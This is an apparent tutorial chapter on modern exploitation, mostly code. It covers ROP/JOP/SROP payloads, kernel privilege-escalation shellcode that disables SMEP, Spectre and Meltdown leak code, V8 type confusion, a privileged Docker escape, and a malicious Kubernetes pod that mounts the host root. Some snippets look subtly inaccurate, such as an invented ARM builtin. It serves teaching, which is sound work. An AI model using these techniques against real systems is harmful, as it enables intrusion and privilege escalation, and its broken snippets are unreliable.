# Modern Exploitation Techniques

Modern exploitation has evolved significantly due to advanced security mitigations. This section covers cutting-edge techniques used to bypass contemporary protections and achieve reliable exploitation.

## Modern Mitigations Landscape

### Hardware-Based Protections

**Intel CET (Control-flow Enforcement Technology)**
- **Shadow Stack**: Hardware-backed return address protection
- **Indirect Branch Tracking**: Validates indirect calls/jumps

**ARM Pointer Authentication**
```c
// ARM64 pointer authentication
void *authenticated_ptr = __builtin_arm_auth_pointer(ptr, key);
```

**Intel MPX (Memory Protection Extensions)**
- Hardware bounds checking for pointers
- Deprecated in newer processors

### Software Mitigations

**CFI (Control Flow Integrity)**
```c
// Clang CFI example
__attribute__((cfi_canonical_jump_table))
void function_with_cfi() {
    // Protected against ROP/JOP
}
```

**Stack Clash Protection**
- Prevents stack/heap collision attacks
- Probes stack growth to detect manipulation

## Advanced ROP Techniques

### JOP (Jump-Oriented Programming)

Uses indirect jumps instead of returns for control flow.

```python
# JOP chain construction
def build_jop_chain():
    # Find gadgets ending in indirect jumps
    gadget1 = 0x401234  # pop rdi; jmp [rax]
    gadget2 = 0x401567  # pop rsi; jmp [rbx]
    
    chain = [
        gadget1,
        p64(arg1),      # rdi value
        gadget2,
        p64(arg2),      # rsi value
        # ... continue chain
    ]
    return chain
```

### SROP (Sigreturn-Oriented Programming)

Exploits `sigreturn` syscall to control all registers.

```python
def srop_exploit():
    # Build sigreturn frame
    frame = SigreturnFrame()
    frame.rax = 59         # execve syscall
    frame.rdi = binsh_addr # "/bin/sh" address
    frame.rsi = 0          # argv
    frame.rdx = 0          # envp
    frame.rip = syscall_gadget
    
    payload = b"A" * offset
    payload += p64(sigreturn_gadget)
    payload += bytes(frame)
    
    return payload
```

### Stack Pivoting

Moves stack pointer to controlled memory region.

```python
def stack_pivot():
    # Find stack pivot gadget
    pivot_gadget = 0x401890  # mov rsp, rdi; ret
    
    payload = b"A" * offset
    payload += p64(pop_rdi_ret)
    payload += p64(fake_stack_addr)
    payload += p64(pivot_gadget)
    
    return payload
```

## Kernel Exploitation

### ret2usr

Returns from kernel space to user space to execute shellcode.

```c
// Kernel vulnerability example
static long device_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    char buffer[256];
    if (copy_from_user(buffer, (void *)arg, 1024)) {  // Buffer overflow!
        return -EFAULT;
    }
    return 0;
}
```

```python
# ret2usr exploitation
def ret2usr_exploit():
    # 1. Map executable page in userland
    shellcode_addr = mmap(0x1337000, 0x1000, 
                          PROT_READ | PROT_WRITE | PROT_EXEC,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)
    
    # 2. Write privilege escalation shellcode
    shellcode = asm("""
        /* Disable SMEP if enabled */
        mov rax, cr4
        and rax, ~(1 << 20)
        mov cr4, rax
        
        /* Escalate privileges */
        mov rdi, 0
        call prepare_kernel_cred
        mov rdi, rax
        call commit_creds
        
        /* Return to userland */
        swapgs
        mov rax, 0x1337000
        iretq
    """)
    
    # 3. Trigger kernel vulnerability
    payload = b"A" * offset + p64(shellcode_addr)
    trigger_vuln(payload)
```

### KASLR Bypass

```python
def bypass_kaslr():
    # Method 1: Information leak
    kernel_text_leak = leak_kernel_address()
    kernel_base = kernel_text_leak & ~0xfff
    
    # Method 2: Prefetch side-channel
    def timing_attack():
        for candidate in range(0xffffffff80000000, 0xffffffffc0000000, 0x100000):
            start = time.time()
            try:
                # Attempt to access potential kernel address
                access_memory(candidate)
            except:
                pass
            timing = time.time() - start
            
            if timing < threshold:  # Fast access = valid mapping
                return candidate
    
    return kernel_base
```

## Browser Exploitation

### V8 Engine Exploitation

```javascript
// Type confusion example
let oob_array = [1.1, 2.2, 3.3];
let obj_array = [{}, {}, {}];

// Trigger type confusion through optimization
function type_confuse(flag) {
    let a = flag ? oob_array : obj_array;
    return a[0];
}

// Force optimization
for (let i = 0; i < 100000; i++) {
    type_confuse(true);
}

// Trigger type confusion
let confused = type_confuse(false);
```

### JIT Spray

```javascript
// JIT spray technique
function jit_spray() {
    // Craft shellcode in constants
    let shellcode = 0x90909090;  // NOP sled
    
    function spray_func() {
        // Force JIT compilation with shellcode constants
        return shellcode + shellcode + shellcode;
    }
    
    // Trigger JIT compilation
    for (let i = 0; i < 100000; i++) {
        spray_func();
    }
    
    // Find JIT code page and execute
    execute_jit_code();
}
```

## Side-Channel Attacks

### Spectre Exploitation

```c
// Spectre variant 1 example
unsigned char array1[16];
unsigned char array2[256 * 512];
unsigned char temp;
unsigned int array1_size = 16;

void spectre_attack(size_t x) {
    if (x < array1_size) {  // Bounds check
        // Speculative execution may bypass this check
        temp &= array2[array1[x] * 512];
    }
}

// Measure timing to extract data
void extract_byte(size_t malicious_x) {
    // Train branch predictor
    for (int i = 0; i < 5; i++) {
        spectre_attack(i);
    }
    
    // Flush cache
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&array2[i * 512]);
    }
    
    // Attack with out-of-bounds index
    spectre_attack(malicious_x);
    
    // Time memory accesses to determine leaked byte
    for (int i = 0; i < 256; i++) {
        int junk = 0;
        register uint64_t time1 = __rdtscp(&junk);
        junk = array2[i * 512];
        register uint64_t time2 = __rdtscp(&junk);
        
        if ((time2 - time1) < CACHE_HIT_THRESHOLD) {
            printf("Leaked byte: %02x\n", i);
        }
    }
}
```

### Meltdown Exploitation

```c
// Meltdown example
void meltdown_attack(void *kernel_addr) {
    char *probe_array = mmap(NULL, 256 * 4096, PROT_READ | PROT_WRITE,
                             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    
    // Flush probe array from cache
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&probe_array[i * 4096]);
    }
    
    // Speculative execution reads kernel memory
    register char kernel_data = *(char *)kernel_addr;
    
    // Encode leaked data in cache state
    probe_array[kernel_data * 4096] = 1;
    
    // Measure cache timings to extract data
    for (int i = 0; i < 256; i++) {
        uint64_t start = __rdtsc();
        volatile char dummy = probe_array[i * 4096];
        uint64_t end = __rdtsc();
        
        if ((end - start) < CACHE_THRESHOLD) {
            printf("Kernel byte: %02x\n", i);
            break;
        }
    }
}
```

## Exploit Automation

### Automatic Exploit Generation

```python
# Symbolic execution for exploit generation
import angr
import claripy

def auto_exploit_generation(binary_path):
    # Load binary
    project = angr.Project(binary_path)
    
    # Create symbolic input
    flag = claripy.BVS('flag', 8 * 32)  # 32-byte flag
    
    # Set up simulation manager
    simgr = project.factory.simulation_manager()
    
    # Find path to win condition
    simgr.explore(find=win_address, avoid=lose_address)
    
    if simgr.found:
        solution_state = simgr.found[0]
        return solution_state.solver.eval(flag, cast_to=bytes)
    
    return None
```

### ML-Assisted Exploitation

```python
# Neural network for gadget classification
import tensorflow as tf

def train_gadget_classifier():
    model = tf.keras.Sequential([
        tf.keras.layers.Dense(128, activation='relu'),
        tf.keras.layers.Dense(64, activation='relu'),
        tf.keras.layers.Dense(1, activation='sigmoid')
    ])
    
    # Train on gadget features
    model.compile(optimizer='adam', 
                  loss='binary_crossentropy',
                  metrics=['accuracy'])
    
    return model

def find_gadgets_with_ml(binary_data):
    model = load_trained_model()
    features = extract_features(binary_data)
    predictions = model.predict(features)
    
    return [addr for addr, pred in zip(addresses, predictions) if pred > 0.8]
```

## Containerized Exploitation

### Docker Escape

```bash
# Container escape through privileged container
docker run --privileged -it ubuntu:latest /bin/bash

# Mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# Access host files
chroot /mnt/host /bin/bash
```

### Kubernetes Exploitation

```yaml
# Malicious pod with host access
apiVersion: v1
kind: Pod
metadata:
  name: evil-pod
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: evil-container
    image: alpine
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
```

## IoT and Embedded Exploitation

### Firmware Analysis

```python
# Automated firmware extraction and analysis
def analyze_firmware(firmware_path):
    # Extract filesystem
    os.system(f"binwalk -e {firmware_path}")
    
    # Find UART/debug interfaces
    uart_strings = ["console", "debug", "shell", "login"]
    
    # Analyze for hardcoded credentials
    credentials = find_credentials(firmware_path)
    
    # Check for known vulnerabilities
    vulns = scan_vulnerabilities(firmware_path)
    
    return {
        'credentials': credentials,
        'vulnerabilities': vulns,
        'debug_interfaces': uart_strings
    }
```

## Key Takeaways

1. **Adapt to modern mitigations**: Traditional techniques often require sophisticated bypasses
2. **Combine multiple primitives**: Modern exploits chain various vulnerabilities and techniques
3. **Leverage side-channels**: Hardware vulnerabilities provide new attack vectors
4. **Automate discovery**: Use tools like symbolic execution and ML for exploit development
5. **Understand target architecture**: Different platforms require specialized techniques
6. **Stay current**: The security landscape evolves rapidly with new mitigations and bypasses
7. **Think beyond traditional exploitation**: Consider supply chain, cloud, and IoT attack vectors

Modern exploitation requires a deep understanding of both hardware and software security mechanisms, as well as the creativity to chain multiple techniques for reliable exploitation.
